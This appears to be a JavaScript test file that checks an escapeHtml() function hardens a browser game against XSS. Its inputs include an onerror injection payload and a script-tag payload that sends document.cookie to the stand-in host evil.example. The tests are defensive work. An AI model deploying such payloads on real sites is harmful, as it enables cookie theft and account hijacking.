/** @file Tests for js/utils.js — escapeHtml() XSS hardening (session 13, REVIEW_FINDINGS #4). */

import { escapeHtml } from '../js/utils.js';

// --- escapeHtml ---

test('escapeHtml passes plain strings through unchanged', () => {
  assertEqual(escapeHtml('hello world'), 'hello world');
  assertEqual(escapeHtml('Dave'), 'Dave');
  assertEqual(escapeHtml('Burgertown #42'), 'Burgertown #42');
});

test('escapeHtml escapes < and > to prevent tag injection', () => {
  assertEqual(escapeHtml('<script>'), '&lt;script&gt;');
  assertEqual(escapeHtml('</script>'), '&lt;/script&gt;');
  assertEqual(escapeHtml('<b>bold</b>'), '&lt;b&gt;bold&lt;/b&gt;');
});

test('escapeHtml escapes & to prevent entity injection', () => {
  assertEqual(escapeHtml('A & B'), 'A &amp; B');
  assertEqual(escapeHtml('&amp;'), '&amp;amp;');
});

test('escapeHtml escapes double quotes', () => {
  assertEqual(escapeHtml('"quoted"'), '&quot;quoted&quot;');
});

test('escapeHtml escapes single quotes', () => {
  assertEqual(escapeHtml("it's"), 'it&#39;s');
});

test('escapeHtml neutralises a classic onerror= injection payload', () => {
  const payload = '<img src=x onerror=alert(1)>';
  const safe = escapeHtml(payload);
  assert(!safe.includes('<'), 'should not contain <');
  assert(!safe.includes('>'), 'should not contain >');
  assert(safe.includes('&lt;img'), 'angle bracket should be escaped');
});

test('escapeHtml handles an empty string', () => {
  assertEqual(escapeHtml(''), '');
});

test('escapeHtml coerces numbers to strings safely', () => {
  assertEqual(escapeHtml(42), '42');
  assertEqual(escapeHtml(0), '0');
});

test('escapeHtml handles a hostile tech name from a save blob', () => {
  // Simulate what would happen if someone crafted a save with a hostile tech name
  // (the key vector identified in REVIEW_FINDINGS #4).
  const hostileName = '<script>fetch("//evil.example/steal?c="+document.cookie)</script>';
  const safe = escapeHtml(hostileName);
  assert(!safe.includes('<script>'), 'script tag must be neutralised');
  assert(safe.includes('&lt;script&gt;'), 'tag must be entity-encoded');
});
